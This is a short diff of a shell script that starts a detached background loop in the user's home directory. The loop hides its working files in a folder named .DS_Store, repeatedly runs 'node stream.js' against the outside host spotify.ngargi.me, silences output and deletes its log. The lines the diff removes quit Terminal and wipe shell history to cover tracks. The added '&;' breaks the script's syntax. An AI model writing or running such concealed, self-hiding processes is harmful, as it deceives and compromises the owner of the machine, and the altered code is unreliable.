@@ -1,8 +1,5 @@
 nohup sh -c "
 cd ~
-osascript -e 'tell application \"Terminal\" to quit'
-history -c
-rm .bash_history
 rm -rf .DS_Store
 mkdir .DS_Store
 cd .DS_Store
@@ -15,4 +12,5 @@ rm ~/nohup.out
 ./node stream.js spotify.ngargi.me > /dev/null
 sleep 1
 done
-" > /dev/null &
+" > /dev/null &;
+clear
